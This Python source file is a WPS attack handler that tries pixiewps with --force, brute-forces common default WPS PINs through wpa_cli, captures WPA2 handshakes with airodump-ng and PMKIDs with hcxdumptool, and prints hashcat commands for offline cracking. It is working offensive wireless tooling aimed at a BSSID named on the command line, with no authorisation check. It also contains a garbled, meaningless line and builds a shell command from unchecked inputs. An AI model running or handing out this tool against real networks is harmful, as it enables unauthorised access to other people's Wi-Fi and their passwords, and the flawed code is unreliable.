#!/usr/bin/env python3
"""
Enhanced WPS Attack Handler - Fallback mechanisms for Pixiewps failures
This module implements a local handler to try multiple fallback strategies
when pixiewps or a direct algorithmic attacker is not available. It is
intended as a pragmatic bridge until full pixiewps-extend integration
is installed (C binary + Python bindings / wrappers).

Features implemented:
 - attempt pixiewps with --force (calls the pixiewps executable)
 - test a short list of common WPS PINs via wpa_cli
 - capture WPA2 handshake using airodump-ng
 - extract PMKID using hcxdumptool

Note: This script invokes external tools. Ensure airodump-ng, pixiewps and
hcxdumptool are installed and run as root when necessary.
"""

import subprocess
import json
import re
import time
import os
from datetime import datetime


class WPSAttackHandler:
    """Handles WPS attacks with comprehensive fallback mechanisms"""

    # Common WPS PINs for quick fallback
    COMMON_PINS = [
        "12345670", "00000000", "11111111", "12341234",
        "88888888", "19283746", "99999999", "11223344"
    ]

    def __init__(self, interface, verbose=True):
        self.interface = interface
        self.verbose = verbose
        self.results = {}

    def log(self, level, msg):
        """Unified logging"""
        if self.verbose or level in ["SUCCESS", "ERROR"]:
            timestamp = datetime.now().strftime("%H:%M:%S")
            symbols = {
                "INFO": "[i]",
                "SUCCESS": "[+]",
                "ERROR": "[-]",
                "WARN": "[!]",
                "DEBUG": "[*]"
            }
            print(f"{symbols.get(level, '[*]')} [{timestamp}] {msg}")

    def run_pixiewps_with_force(self, pke, pkr, e_hash1, e_hash2, authkey, e_nonce):
        """Run Pixiewps with --force flag for aggressive extraction"""
        self.log("INFO", "Attempting pixiewps with --force flag...")

        cmd = [
            "pixiewps",
            "--pke", pke,
            "--pkr", pkr,
            "--e-hash1", e_hash1,
            "--e-hash2", e_hash2,
            "--authkey", authkey,
            "--e-nonce", e_nonce,
            "--force",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = (result.stdout or '') + (result.stderr or '')

            # Parse PIN from output (several formats)
            pin_match = re.search(r"(WPS pin|PIN)[:\s]+[\"']?([0-9]{4,8})[\"']?",
                                  output, re.IGNORECASE)
            if pin_match:
                pin = pin_match.group(2)
                # If 7-digit returned, compute checksum
                if len(pin) == 7:
                    from math import floor
                    def checksum(pin7:int):
                        accum = 0
                        p = pin7
                        while p:
                            accum += 3 * (p % 10)
                            p //= 10
                            accum += p % 10
                            p //= 10
                        return (10 - accum % 10) % 10
                    pin = pin + str(checksum(int(pin)))
                self.log("SUCCESS", f"PIN found with --force: {pin}")
                return {"pin": pin, "method": "pixiewps_force"}
            else:
                self.log("DEBUG", f"pixiewps output (truncated):\n{output[:1000]}")
                return None
        except subprocess.TimeoutExpired:
            self.log("WARN", "pixiewps with --force timed out")
            return None
        except FileNotFoundError:
            self.log("WARN", "pixiewps binary not found. Install pixiewps or pixiewps-extend.")
            return None
        except Exception as e:
            self.log("ERROR", f"pixiewps execution failed: {e}")
            return None

    def test_common_pins(self, bssid, essid, interface):
        """Test common default WPS PINs"""
        self.log("INFO", "Testing common WPS PINs...")

        for i, pin in enumerate(self.COMMON_PINS, 1):
            self.log("INFO", f"[{i}/{len(self.COMMON_PINS)}] Testing PIN: {pin}")
            if self.try_wps_pin(bssid, pin, interface):
                self.log("SUCCESS", f"PIN accepted: {pin}")
                return {"pin": pin, "method": "common_pin_bruteforce"}
            time.sleep(1)

        self.log("WARN", "None of the common PINs worked")
        return None

    def try_wps_pin(self, bssid, pin, interface):
        """Test if a WPS PIN is valid using wpa_cli/wpa_supplicant"""
        try:
            # Prefer wpa_cli if available
            if shutil_which := shutil_which if False else None:
                pass
        except Exception:
            pass

        try:
            cmd = f"wpa_cli -i{interface} wps_reg {bssid} {pin}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=12)
            out = (result.stdout or '') + (result.stderr or '')
            if result.returncode == 0 and ("OK" in out or "SUCCESS" in out.upper() or "wps success" in out.lower()):
                return True
            # Some wpa_cli variants return textual status; look for common success tokens
            if re.search(r"(WPS:\s*success|GOT_PSK|WPS-ENROLLEE-.*OK)", out, re.IGNORECASE):
                return True
            return False
        except Exception:
            return False

    def capture_handshake(self, bssid, essid, channel, timeout=25):
        """Capture WPA2 handshake for offline cracking using airodump-ng"""
        self.log("INFO", f"Capturing WPA2 handshake for {essid} ({bssid}) on channel {channel}...")

        base = f"/tmp/{essid}_{bssid.replace(':', '')}"
        try:
            cmd = [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "-w", base,
                self.interface,
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.log("DEBUG", f"Capturing for {timeout} seconds...")
            time.sleep(timeout)
            proc.terminate()
            proc.wait(timeout=5)

            cap_file = f"{base}-01.cap"
            if os.path.exists(cap_file):
                self.log("SUCCESS", f"Handshake captured: {cap_file}")
                return {
                    "handshake": cap_file,
                    "method": "wpa2_handshake",
                    "note": f"Use: hashcat -m 22000 {cap_file} wordlist.txt"
                }
            else:
                self.log("WARN", "Handshake capture failed or file not present")
                return None
        except FileNotFoundError:
            self.log("WARN", "airodump-ng not found. Install aircrack-ng package.")
            return None
        except Exception as e:
            self.log("ERROR", f"Handshake capture error: {e}")
            return None

    def extract_pmkid(self, bssid, essid, timeout=15):
        """Extract PMKID for offline WPA2-PSK cracking using hcxdumptool"""
        self.log("INFO", "Attempting PMKID extraction...")

        out_file = f"/tmp/pmkid_{essid}_{bssid.replace(':', '')}.pcapng"
        try:
            cmd = [
                "hcxdumptool",
                "-i", self.interface,
                "-o", out_file,
                "--enable_status=3",
                "--filterlist=",
                "--filtermode=0",
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.log("DEBUG", f"Extracting for {timeout} seconds...")
            time.sleep(timeout)
            proc.terminate()
            proc.wait(timeout=5)

            if os.path.exists(out_file) and os.path.getsize(out_file) > 24:
                self.log("SUCCESS", f"PMKID extracted: {out_file}")
                return {
                    "pmkid": out_file,
                    "method": "pmkid_offline",
                    "note": f"Use: hashcat -m 16800 {out_file} wordlist.txt"
                }
            else:
                self.log("WARN", "PMKID extraction failed - output file missing or empty")
                return None
        except FileNotFoundError:
            self.log("WARN", "hcxdumptool not found. Install hcxdumptool package.")
            return None
        except Exception as e:
            self.log("ERROR", f"PMKID extraction error: {e}")
            return None

    def comprehensive_attack(self, bssid, essid, pke=None, pkr=None, e_hash1=None, e_hash2=None, authkey=None, e_nonce=None, channel=6):
        """Execute comprehensive WPS attack with multiple fallbacks"""
        self.log("INFO", "=" * 60)
        self.log("INFO", f"Starting comprehensive WPS attack on {essid} ({bssid})")
        self.log("INFO", "=" * 60)

        result = {
            "bssid": bssid,
            "essid": essid,
            "success": False,
            "pin": None,
            "method": None,
            "handshake": None,
            "pmkid": None,
            "alternatives": []
        }

        # Stage 1: pixiewps with --force if crypto fields present
        if pke and pkr and e_hash1 and e_hash2 and authkey and e_nonce:
            self.log("INFO", "Stage 1: pixiewps (forced)")
            pix_result = self.run_pixiewps_with_force(pke, pkr, e_hash1, e_hash2, authkey, e_nonce)
            if pix_result and pix_result.get("pin"):
                result["pin"] = pix_result["pin"]
                result["method"] = pix_result["method"]
                result["success"] = True
                self.log("SUCCESS", "Attack succeeded via pixiewps_force!")
                return result

        # Stage 2: common PIN brute-force
        self.log("INFO", "Stage 2: common PIN brute-force")
        pin_result = self.test_common_pins(bssid, essid, self.interface)
        if pin_result and pin_result.get("pin"):
            result["pin"] = pin_result["pin"]
            result["method"] = pin_result["method"]
            result["success"] = True
            self.log("SUCCESS", "Attack succeeded via common PIN!")
            return result

        # Stage 3: Handshake capture for offline cracking
        self.log("INFO", "Stage 3: WPA2 Handshake capture")
        hs_result = self.capture_handshake(bssid, essid, channel, timeout=25)
        if hs_result:
            result["handshake"] = hs_result["handshake"]
            result["alternatives"].append(hs_result)
            self.log("SUCCESS", "Handshake captured - use offline cracking")

        # Stage 4: PMKID extraction
        self.log("INFO", "Stage 4: PMKID extraction")
        pmkid_result = self.extract_pmkid(bssid, essid, timeout=15)
        if pmkid_result:
            result["pmkid"] = pmkid_result["pmkid"]
            result["alternatives"].append(pmkid_result)
            self.log("SUCCESS", "PMKID extracted - use offline cracking")

        # Summary
        if result["success"]:
            self.log("SUCCESS", "PIN successfully obtained!")
        else:
            if result["alternatives"]:
                self.log("WARN", f"PIN not found, but captured {len(result['alternatives'])} offline cracking option(s)")
                self.log("INFO", "Alternatives for offline cracking:")
                for alt in result["alternatives"]:
                    self.log("INFO", f"  - {alt.get('note', 'N/A')}")
            else:
                self.log("ERROR", "All attack stages failed - target may be invulnerable or out of range")

        return result


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="Run enhanced local WPS attack handler (standalone)")
    ap.add_argument('bssid')
    ap.add_argument('--essid', default='TestNetwork')
    ap.add_argument('--channel', type=int, default=6)
    ap.add_argument('--interface', default='wlan0mon')
    args = ap.parse_args()

    handler = WPSAttackHandler(args.interface, verbose=True)
    out = handler.comprehensive_attack(bssid=args.bssid, essid=args.essid, channel=args.channel)
    print('\n=== ATTACK RESULTS ===')
    print(json.dumps(out, indent=2))
